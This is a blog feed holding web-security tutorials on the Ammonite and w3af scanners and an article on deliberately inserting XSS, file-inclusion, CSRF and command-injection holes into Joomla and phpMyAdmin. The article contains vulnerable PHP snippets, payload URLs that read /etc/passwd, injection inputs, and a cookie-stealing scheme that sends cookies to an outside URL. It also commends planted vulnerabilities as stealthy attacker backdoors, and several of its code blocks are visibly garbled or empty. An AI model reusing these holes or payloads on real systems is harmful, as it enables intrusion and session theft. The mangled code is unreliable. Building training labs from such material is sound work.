&lt;p&gt;Again, it is a good practice to look at the request and the response that led to the identification of the vulnerability.&lt;/p&gt;

&lt;h2 id=&quot;automated-testing&quot;&gt;Automated Testing&lt;/h2&gt;

&lt;p&gt;Uptil now, we have been performing manual scanning. In order to perform fast scanning over a large target surface, the whole process should be automatic. However, we don’t want to scan every session url which Fiddler idenifies. In order to circumvent this issue, we use regular expressions to filter url’s that we want to scan. To use Fiddler in automatic mode, simply check the &lt;em&gt;Automatic mode&lt;/em&gt; in the Testing Options.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ammonite/22.png&quot; alt=&quot;22&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, we need to specify a URL Filter to specify which url’s we want to test on. For that, we will be using regular expressions. If you are performing a large scan, you should check the &lt;em&gt;Skip media responses&lt;/em&gt; option which skips automatic testing for sessions with media responses. An example of a regular expression would be &lt;em&gt;^www.example.com&lt;/em&gt;. This will test all the url’s which start with www.example.com.&lt;/p&gt;

&lt;p&gt;So lets perform an automated scan. I will be performing scans on all the urls on my local server with the IP address 10.0.1.24 . The appropriate url filter is set as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ammonite/23.png&quot; alt=&quot;23&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So now when we browse to any url on my local server, ammonite will start the scan automatically as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ammonite/24.png&quot; alt=&quot;24&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The results obtained by performing the scan are displayed in the figure below. We can see that ammonite was able to find a couple of vulnerabilities in the pages we browsed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ammonite/25.png&quot; alt=&quot;25&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When performing a scan on a large target surface, it is essential to check only those vulnerabilities which we want to scan for. Otherwise, the scan may take a long time. One of the other advantages with Ammonite is that we can pause, resume or cancel any specific task. So if a task is taking too long, you might just want to stop it. We can also specify the various options like no of requests per second, timeout, number of threads etc in order to get the best performance.&lt;/p&gt;

&lt;h2 id=&quot;exporting-requests&quot;&gt;Exporting Requests&lt;/h2&gt;

&lt;p&gt;Ammonite also allows us to export requests as &lt;em&gt;Python 2.7 urllib2&lt;/em&gt; or &lt;em&gt;Python 3 urlib&lt;/em&gt; code. This could be useful in cases where you would like to regenerate the request while doing some exploit development etc. In order to regenerate the request, right click on the request and click on &lt;em&gt;Export as Python 2.7 urllib2&lt;/em&gt; or &lt;em&gt;Export as Python 3 urllib&lt;/em&gt; as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ammonite/16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, we can see that Ammonite generated a function in Python which initializes the request, adds the required header fields and then return the request. Please note that we can also edit the function before saving it. So if i want to change the &lt;em&gt;User-Agent&lt;/em&gt; field in the header, i can do that before saving the function.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ammonite/17.png&quot; alt=&quot;17&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;generating-reports&quot;&gt;Generating Reports&lt;/h2&gt;

&lt;p&gt;Once the vulnerability scan has been performed, we can also generate HTML reports from the results of the scans. The generated report includes information like issue description, risk rating, reproduction steps, remediation instructions, and sample requests and responses. We can also filter the results based on a specific criteria or simply select the vulnerabilities which we want to be included in the report or we can choose a combination of both.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ammonite/18.png&quot; alt=&quot;18&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once we have generated the report, we can save it as a html file. Here is how a sample report generated by Ammonite looks like.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ammonite/19.png&quot; alt=&quot;19&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Ammonite is a Fiddler extension which allows us to scan web applications for common vulnerabilities. In this article we looked at some of the examples where ammonite helped us detect vulnerabilities like verbose and blind OS commanding, local file inclusion, cross site scripting etc. It can also identify information disclosure by scanning the response for important information like credit card numbers etc or finding out hidden forms etc. One of the other interesting features of Ammonite is that we can pause, cancel and resume individual test cases. Ammonite also allows us to export requests in Python and generate reports.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References:&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Ammonite Features&lt;br /&gt;
&lt;a href=&quot;http://ammonite.ryscc.com/features.html&quot;&gt;http://ammonite.ryscc.com/features.html&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Ammonite FAQ&lt;br /&gt;
&lt;a href=&quot;http://ammonite.ryscc.com/faq.html&quot;&gt;http://ammonite.ryscc.com/faq.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>Inserting Vulnerabilities in Web Applications</title>
   <link href="https://bitbrain.github.io/2013/06/13/inserting-vulnerabilities-in-web-applications.html"/>
   <updated>2013-06-13T20:43:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/13/inserting-vulnerabilities-in-web-applications</id>
   <content type="html">&lt;p&gt;In this article we will look at how we can insert vulnerabilities in web applications. Why? There are basically two reasons. Firstly, because it allows us to see the application from the eyes of a web developer and not a hacker. Secondly, because it allows us to create a platform where we can create a set of vulnerable web applications, and fuse them all together in a Virtual machine. So now, several people can test their web application security skills on the VM and learn from it. Some of the other reasons might be to leave a backdoor onto the server once the attacker has got access. Some of the backdoors could be very easily found out as they stand apart from the rest of the applications, but if the web application itself has been made vulnerable instead, then its a bit tough to detect it.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;In this article we will be looking at some of the Open Source Web Applications, for e.g Joomla, phpMyAdmin etc, see what mechanisms the developers use to protect these application from OWASP Top 10 Web Application Vulnerabilities, and then look at how we can change the code to make the application vulnerable.&lt;/p&gt;

&lt;p&gt;The first and foremost thing to do is to change some of the configurations in the &lt;em&gt;php.ini&lt;/em&gt; file of your server. There are some configurations in this file that may protect the web application from being exploited. In my case the php.ini was located in the location &lt;em&gt;/etc/php.ini&lt;/em&gt;. In your case it might be different. Instead of changing the configuration of your main &lt;em&gt;php.ini&lt;/em&gt; file, you can instead make a custom &lt;em&gt;php.ini&lt;/em&gt; file in your web application which could overwrite the settings in the main &lt;em&gt;php.ini&lt;/em&gt; file, though this may not work all the time. Hence we will go with editing the main &lt;em&gt;php.ini&lt;/em&gt; file. Open up your &lt;em&gt;php.ini&lt;/em&gt; file and make sure the following settings match with your php.ini file.&lt;/p&gt;

&lt;pre&gt;safe_mode = Off&lt;/pre&gt;

&lt;p&gt;The safe mode is used to prevent your server from getting exploited by blocking some of the dangerous functions like shell execution in php etc. According to &lt;a href=&quot;http://php.net&quot;&gt;php.net&lt;/a&gt;, this feature has been DEPRECATED as of PHP 5.3.0.&lt;/p&gt;

&lt;pre&gt;register_globals = On&lt;/pre&gt;

&lt;p&gt;This setting allows the modification of global variables from the URL. For e.g if the url is &lt;em&gt;http://infosecinstitute.com?q=infosec&lt;/em&gt; then this means that the value of “q” can be changed depending upon the URL (in this case it is “infosec”). In case of a different url say &lt;em&gt;http://infosecinstitute.com?q=test&lt;/em&gt;, the value of q will be “test”. Hence it can be modified by just changing the URL. We will see later how this helps us while inserting File Inclusion vulnerabilities.&lt;/p&gt;

&lt;pre&gt;allow_url_fopen = On&lt;/pre&gt;

&lt;p&gt;This options allows the treatment of URL’s as files.&lt;/p&gt;

&lt;pre&gt;allow_url_include = On&lt;/pre&gt;

&lt;p&gt;This option uses the function include, include_once, require, require_once to open URL’s as files.&lt;/p&gt;

&lt;pre&gt;magic_quotes_gpc = Off&lt;/pre&gt;

&lt;p&gt;This disables the feature of php where it tries to escape any malicious characters which might corrupt the data or might perform an injection attack.&lt;/p&gt;

&lt;pre&gt;file_uploads = On&lt;/pre&gt;

&lt;p&gt;This allows the use of HTTP file uploads&lt;/p&gt;

&lt;pre&gt;display_errors = On&lt;/pre&gt;

&lt;p&gt;This feature allows the server to display errors. Though this might be a useful setting while development but it should not be set to ON once the web application is live. This is because the errors might leak sensitive information about the web application.&lt;/p&gt;

&lt;p&gt;Once you have made these changes, save the &lt;em&gt;php.ini&lt;/em&gt; file (make sure that it is writable). Restart the server to make the changes come into effect.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/insvul/first.png&quot; alt=&quot;First&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The next step is to download Joomla, which is an open source Content Management System. Joomla can be downloaded from &lt;a href=&quot;http://www.joomla.org/download.html&quot;&gt;here.&lt;/a&gt; Once it is downloaded, install in on your system and remove the installation directory. Once all of these steps are done, the Joomla home page should look like this.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/insvul/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s go the Joomla directory and analyze the code. The joomla directory has a .htaccess file. Let’s see what are the configurations in it. Open up the .htaccess file .&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/insvul/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see that their is a lot of interesting stuff here. Let’s analyze them one by one.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/insvul/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This code is used to stop someone from using base64 encoding to perform attacks like script execution, login bypass etc.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/insvul/4.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Protection against Cross Site Scripting.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/insvul/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Protection against various types of Inclusion attacks like Local file inclusion and Remote file inclusion&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/insvul/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Protection against File Inclusion attacks like Local file inclusion and Remote file inclusion and also SQL Injection to some extent. This is because the attacker might modify the parameters sent via GET or POST Request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/insvul/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In case the user tries to browse somewhere he doesn’t have access to.&lt;/p&gt;

&lt;p&gt;Now we know what to do. In order to insert vulnerablities into Joomla, these rules should not be there. Comment out these rules so that the file appears like this.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/insvul/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1) Inserting Reflected XSS (Cross Site Scripting)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Let’s say we add the following code to index.php file in Joomla&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php $name = $_GET['name']; if(isset($name)) { print &quot;Welcome, &quot;.$name; } else { print &quot;Welcome, User &quot;; }&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The Joomla main page takes a name parameter in it’s url and displays a welcome message at the top of the main page as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/insvul/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We are right now not sure if the application is vulnerable to Cross Site Scripting, but we know that there is a possibility because the parameter we pass in the url is displayed in the main page without validating it. We also removed the checks for the &lt;em&gt;script&lt;/em&gt; tag previously. Hence if we input some script as the parameter and it gets executed, then we know that it is definitely a vulnerability.&lt;/p&gt;

&lt;p&gt;Let’s enter the following url in the input&lt;/p&gt;

&lt;pre&gt;http://127.0.0.1/Joomla/index.php?name=%3Cscript%3Ealert%28%22This%20is%20definitely%20a%20vulnerability%22%29;%3C/script%3E&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/insvul/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The script gets executed and we are shown an alert. Hence we can confirm that we just inserted a XSS vulnerability in the application.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2) Inserting LFI (Local File Inclusion) and RFI (Remote File Inclusion)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Local file inclusion occur when it is possible to include a file on the server from the URL and see the content inside it. In this case, we will be inserting an LFI vulnerability in Joomla.&lt;/p&gt;

&lt;p&gt;Joomla allows us to create components, in this case we will be creating a custom component. To do this just make a folder named com_COMPONENTNAME in the components folder. In this case our component name would be &lt;em&gt;com_infosec&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/insvul/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Copy all the files from any component and rename it according to the current component, i.e infosec. Once this is done, add the following code in it’s infosec.php file.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php if (isset($_REQUEST[&quot;imp_file&quot;])){ $imp_file = $_REQUEST[&quot;imp_file&quot;]; } require_once($imp_file);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Note that we could have used the code &lt;em&gt;include_once&lt;/em&gt; too. The only difference between them is that &lt;em&gt;include_once&lt;/em&gt; will show an error in case the file is not found while &lt;em&gt;require_once&lt;/em&gt; won’t. From the code it is very clear that the infosec.php will take a file name as the parameter and then include it in the webpage. Since it is possible to modify the request variables because of the settings we changed earlier, it is possible to include any file from the server and display it in the browser. Let’s try and display the /etc/passwd file.&lt;/p&gt;

&lt;p&gt;Go to the following url:&lt;/p&gt;

&lt;pre&gt;http://127.0.0.1/Joomla/index.php?option=com_infosec&amp;amp;name=InfosecInstitute&amp;amp;imp_file=../../../../../etc/passwd&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/insvul/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see that we get a dump of the &lt;em&gt;/etc/passwd&lt;/em&gt; file of the server. Note that the number of &lt;em&gt;”../”&lt;/em&gt; might be different in your case. Hence we have successfully inserted a local file inclusion vulnerability in the web application. Please note that this is also a Remote file Inclusion vulnerability. Let’s try and load up google.com on the Joomla home page.&lt;/p&gt;

&lt;p&gt;Go to the following url:&lt;/p&gt;

&lt;pre&gt;http://127.0.0.1/Joomla/index.php?option=com_infosec&amp;amp;name=InfosecInstitute&amp;amp;imp_file=http://google.com&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/insvul/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We just successfully loaded a remote url on Joomla’s web page. Imagine the consequences of such a vulnerability. It is now possible to execute any remote script present anywhere on the web on the victim.&lt;/p&gt;

&lt;p&gt;Please note that sometimes the code which is responsible for including the file could be like this&lt;/p&gt;

&lt;pre&gt;include($FilePath.'.php');&lt;/pre&gt;

&lt;p&gt;This means that the argument is appended with “.php” and that file name is then included. In this case our previous url will not work because of the extra “.php” after it. However its effect can be nullified by adding the null byte &lt;em&gt;“%00”&lt;/em&gt; after the url. This escapes all the stuff after the null byte.&lt;/p&gt;

&lt;p&gt;Hence in this case our url would be..&lt;/p&gt;

&lt;pre&gt;http://127.0.0.1/Joomla/index.php?option=com_infosec&amp;amp;name=InfosecInstitute&amp;amp;imp_file=http://google.com%00codeDoesntGoHere&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;3) Inserting Information Disclosure vulnerability&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Almost all the web applications have some sort of configuration file. In Joomla, it goes by the name &lt;em&gt;“configurations.php”&lt;/em&gt; and is located in its root directory. Some developers like to keep a backup for their configuration file. The usual norm is to keep it by the extension &lt;em&gt;“.bak”&lt;/em&gt;. Hence the backup file for the configuration file &lt;em&gt;“configurations.php”&lt;/em&gt; would be named as “configurations.php.bak”. However their is a security issue with this. A bak file when accessed from the browser via url will prompt for a download of the file. Hence any user from outside can download the configuration file and hence see all the settings like username, password for Joomla. This needs some guess work from the attacker’s side, though it can also be done by the use of automated tools. The .bak file looks something like this.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/insvul/config_file.png&quot; alt=&quot;Config File&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, a lot of things like the Username, Password for the administrator are clearly visible in the configuration file. Disclosure of the configuration file can lead to complete compromise of the web application.&lt;/p&gt;

&lt;p&gt;Sometimes the admin might need to store his password or some other confidential information in a file on the server, but may not want other users to access it, so he puts it in a directory and gives it a wierd name 21lnkqasdsacnd1eqwdn22qwd2wd. To protect the directory from google and other search engines he modifies the &lt;em&gt;robots.txt&lt;/em&gt; file as shown to disallow web crawlers to index that directory. But the problem is that the robots.txt file is world readable and hence the attacker can figure out the name of the directory once he browses to the &lt;em&gt;robots.txt&lt;/em&gt; file. When we browse to the robots.txt file for Joomla we get something like this.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/insvul/16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We now know that the admin is protecting something from the web crawlers, a folder with a weird name &lt;em&gt;21lnkqasdsacnd1eqwdn22qwd2wd&lt;/em&gt;. Let’s check it out.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/insvul/17.png&quot; alt=&quot;17&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;em&gt;password.txt&lt;/em&gt; file is available for anyone to view. Some developers think that the &lt;em&gt;robots.txt&lt;/em&gt; file is used for hiding subdomains and directories.But in actual it is used to provide direction to web crawlers about what publicly available information should and should not be indexed. Hence if a directory is non-public, then it should not be linked anywhere on the site and it should not be included in robots.txt, because that essentially makes it public. If it is not linked, there is no reason to include it in the robots.txt in the first place.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4)Inserting CSRF (Cross Site Request Forgery) Vulnerability&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;CSRF occurs when an attacker is able to have the victim user make a request to a trusted site (to which he is already authenticated) on behalf of the victim without his knowledge. Some developers think that allowing the victim to submit only POST Requests or using a secret cookie will prevent the victim from CSRF. But this is not true as the cookie will be submitted with every request the victim makes to the trusted website. Also it is very trivial for the attacker to have the victim submit a POST request which can be done by having a secret form on the attacker’s website which would be submitted to the trusted website on behalf of the victim.&lt;/p&gt;

&lt;p&gt;There are some ways to prevent CSRF. One of them is to have a secret token and have it submitted with each request the client makes to the trusted website, either in the URL or in the header. Also this token should have a timeout value after which it should expire and a new token is generated for the user. One of the other ways is to have the authentication data submitted with important requests, for e.g wire transfer, password change etc. Note that in this case the attacker won’t have access to the user’s credentials and hence won’t be able to perform this attack. Inserting a CSRF is hence quite easy. We just need to remove all the checks that prevent CSRF, i.e remove the checking of tokens, authentication data etc. More information about CSRF can be found &lt;a href=&quot;http://en.wikipedia.org/wiki/Cross-site_request_forgery&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;For inserting the next two vulnerabilities we are going to use the web application &lt;em&gt;phpMyAdmin&lt;/em&gt;. More information on phpMyAdmin and to know the steps to install it, click &lt;a href=&quot;http://www.phpmyadmin.net/documentation/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;5) Inserting Reflected XSS (Cross Site Scripting) vulnerabilities&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Let’s assume for one moment that phpmyadmin is an application used by many users and it has just one admin. The admin wants to provide a functionality in a page message.html &lt;em&gt;http://site-IP/phpmyadmin/message.html&lt;/em&gt; that allows any user to post a message to the administrator. The message is passed to a file message.php which writes it to a file text.html without validating the message. The admin can then view all the message by just going to the &lt;em&gt;text.html&lt;/em&gt; page. So if an attacker can inject malicious code in the message field then that code would execute on the admin’s machine once the admin opens up the text.html page. This vulnerability is called Reflected XSS (Cross Site Scripting). Also, by using the same technique the attacker can steal the admin’s cookies. The attacker could use a cookie catcher located somewhere on the web which takes a variable &lt;em&gt;‘c’&lt;/em&gt;. We pass the variable &lt;em&gt;c&lt;/em&gt; as document.cookie (i.e the user’s cookie) to the &lt;em&gt;Cookie Catcher&lt;/em&gt; file (note that we must know the location of the cookie catcher file), for e.g if the Cookie Catcher file URL is &lt;em&gt;http://infosecinstitute.com/cookie_catcher.php&lt;/em&gt; then the request that we will send from the client machine through XSS is &lt;em&gt;http://infosecinstitute.com/cookie_catcher.php?c=USER_COOKIE&lt;/em&gt;. The USER_COOKIE is the cookie we fetch through javascript.This file then writes the Cookie and other values to a file named &lt;em&gt;user_info.html&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Code for “message.html”, the message to the admin is sent from here&lt;/p&gt;

&lt;p&gt;``` php POST YOUR MESSAGE TO ADMIN HERE !&lt;/p&gt;

&lt;form action=&quot;message.php&quot; method=&quot;get&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;c&quot; /&gt;&lt;/form&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
Code for &quot;message.php&quot;, once the message is sent, this code stores the message in a file named text.html

``` php IP: ' .$ip. '  
Date and Time: ' .$date. '  
Referer: '.$referer.'  

'); fclose($fp); //Redirect the user to google.com header (&quot;Location: http://www.google.com&quot;); ?&amp;gt; ```

Code for &quot;Cookie Catcher file&quot;. Note that this file should be stored somewhere on the internet, we call the url of the file with an argument &quot;c&quot; in which we pass the cookie. This file then takes the cookie and other information and writes all the values into a file named &quot;user_info.html&quot;.

``` php IP: ' .$ip. '  
Date and Time: ' .$date. '  
Referer: '.$referer.'  

'); fclose($fp); //Redirect the user to google.com header (&quot;Location: http://www.google.com&quot;); ?&amp;gt; ``` **5) Inserting Remote Command Execution vulnerability**

Phpmyadmin comes with a footer.php file where we can write code which should appear at the bottom of every page in the application. In this case the admin allows the user to ping any server in the world by running the ping command on his server but not filtering out the input properly. So if the attacker inputs something like this _&quot;127.0.0.1 ; ls&quot; OR &quot;127.0.0.1 ; cat /etc/passwd&quot;_ he can run these commands on the remote webserver and see the output too.

Here is how the footer appears in phpMyAdmin

![PhpRemoteExexVuln](/images/posts/insvul/phpRemoteExexVuln.png)

Once we click on submit, the output result looks like this. We can easily deduce that we now have the ability to execute remote commands on the server.

![RemoteExecResult](/images/posts/insvul/remoteExecResult.png)

Here is the code for the file &quot;config.footer.inc.php&quot;

``` php

# Find which server is online anywhere in the world

Enter an IP address of the server below:

&amp;lt;form name=&quot;ping&quot; action=&quot;ping.php&quot; method=&quot;post&quot;&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;ip&quot; size=&quot;30&quot;&amp;gt; &amp;lt;input type=&quot;submit&quot; value=&quot;submit&quot; name=&quot;submit&quot;&amp;gt;&amp;lt;/form&amp;gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here is the code for the file “ping.php”&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;In this article we looked at how we can insert vulnerabilities in web applications. We took some of the popular open source applications like Joomla and phpMyAdmin as the example, learnt how it protected itself from various common exploits and then bypassed those protection mechanisms to make the application vulnerable. Inserting vulnerabilities can be useful for many reasons, a company might want to set up a test environment for it’s users to test their Web Application Security skills, or because an attacker who has already broken into the web application might want to leave a backdoor so that he can get access later. Hence, instead of leaving behind a standalone backdoor which stands apart from all the web applications on the server and could be easily detected , inserting a vulnerability in a web application is a much better option because of the stealth involved in this case.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References:&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;PHP: The configuration file - Manual&lt;br /&gt;
http://php.net/manual/en/configuration.file.php&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Cross-site_request_forgery&lt;br /&gt;
http://en.wikipedia.org/wiki/Cross-site_request_forgery&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>w3af walkthrough and tutorial part 4 - w3af tools</title>
   <link href="https://bitbrain.github.io/2013/06/13/w3af-walkthrough-and-tutorial-part-4-w3af-tools.html"/>
   <updated>2013-06-13T20:35:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/13/w3af-walkthrough-and-tutorial-part-4-w3af-tools</id>
   <content type="html">&lt;p&gt;In the previous articles in this series, we looked at all the plugins available in w3af and looked at their applications in different scenarios. In this article, we will look at some of the other tools present in w3af which allow us to send Manual Requests, perform Fuzzing, Encode and Decode requests and responses, use a Proxy to intercept and modify requests and responses, and allow us to perform a comparison between different HTTP requests and responses. We will also look at how we can write our own w3af scripts to automate the task of Web Application Penetration Testing. We will then look at the various profiles present in w3af.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;&lt;strong&gt;1)Manual Request -&lt;/strong&gt;The Manual Request feature in w3af allows us to send specially crafted requests and then analyze the response. This technique could be used in various cases which includes testing for SQL Injection, Cross Site Scripting etc. The tools present in w3af can be found by clicking on the &lt;em&gt;Tools&lt;/em&gt; menu as shown in the figure below. Click on &lt;em&gt;Manual Request&lt;/em&gt; to open up the Manual Request editor tool.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af4/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, you can write your own manual request and send it to analyze the response. As you can see from the figure below, i am making a simple GET request to http://google.com . Also, you might want to change the &lt;em&gt;User-Agent&lt;/em&gt; field as this gives away the fact that the request is coming from w3af.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af4/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Click on &lt;em&gt;Send Request&lt;/em&gt; to send the request. Once this is done, the response will be displayed. You can then simply analyze the response or send it to other w3af tools.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af4/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is also possible to send requests to the Manual Request Editor from the results of scans by clicking on its corresponding button below the request/response as shown in the figure below. Same applies to all the other tools like Encoder/Decoder, Fuzzy Request editor, Export Requests etc.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af4/X.png&quot; alt=&quot;X&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2)Fuzzy Request -&lt;/strong&gt; The Fuzzy Request feature present in w3af allows us to send different requests with varying data and analyze the responses. &lt;img src=&quot;/images/posts/w3af4/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The fuzzy request editor is shown in the figure above. The varying text is added between the dollar sign ($). It is clear from the figure above that the varying data is determined by the syntax “$xrange(10)$” which includes numbers from 0 to 9. In case two such text generators are present, then the requests will be combined. For e.g if one of the generator generates 5 values whereas the other generator generates 6 values, then the total number of requests that will be sent will be 30. Some of the common syntax used to generate variable text is shown in the figure below from w3af GUI.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af4/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once we have written the generators, we can simply click on &lt;em&gt;Analyze&lt;/em&gt; to analyze the requests that will be generated during the fuzzing test. This is useful because it allows you to actually see these requests before sending them.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af4/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Click on the play button in the bottom left to send the requests. Once the requests have been sent, you can analyze the responses by clicking on the Response tab.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af4/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the responses are received, you can seperate these responses into different clusters. There are different clustering methods present in w3af which have different ways of determining the distance between these HTTP responses. Using these responses, different clusters are created and the responses with the minimum difference between them are added to the same cluster. This is a quick way to determine which response stands out as different from the other responses which is an important step in Fuzzing.&lt;/p&gt;

&lt;p&gt;The figure below shows the cluster created by using the method &lt;em&gt;Levenshtein distance of the HTTP bodies&lt;/em&gt;. w3af also allows you to write a customized clustering method to perform the task. It is also possible to send requests to the Fuzzy Request generator from the results of scans.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af4/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3)Encode/Decode -&lt;/strong&gt; The Encode/Decode tool in w3af is used to encode or decode strings, urls etc. You can choose from a variety of encoding and decoding options. The figure below shows a base64 encoded string being decoded by the w3af decode tool.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af4/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

